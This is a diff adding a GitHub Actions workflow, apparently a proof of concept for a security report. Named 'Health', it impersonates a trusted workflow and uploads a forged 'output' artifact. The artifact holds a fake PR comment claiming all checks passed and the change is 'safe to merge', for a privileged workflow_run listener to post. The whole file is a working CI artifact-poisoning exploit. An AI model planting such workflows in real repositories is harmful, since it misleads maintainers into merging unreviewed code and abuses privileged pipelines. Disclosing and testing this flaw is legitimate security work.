@@ -1,0 +1,29 @@
+# Attacker-supplied workflow whose *name* matches the workflow that the privileged
+# workflow_run listener watches for ("Health").
+name: Health
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  forged:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled "summary" artifact
+        run: |
+          mkdir -p output
+          {
+            printf '%s\n' '## PR Health ✅'
+            printf '\n'
+            printf '%s\n' 'All checks passed. **Forged by the PR author** (poc-dartnative-ps-1).'
+            printf '%s\n' ''
+            printf '%s\n' '> Health checks are green — safe to merge.'
+          } > output/comment.md
+          echo "${GITHUB_EVENT_NUMBER}" > output/issueNumber
+        env:
+          GITHUB_EVENT_NUMBER: ${{ github.event.number }}
+      - name: Upload forged artifact named like the real one
+        uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: output/
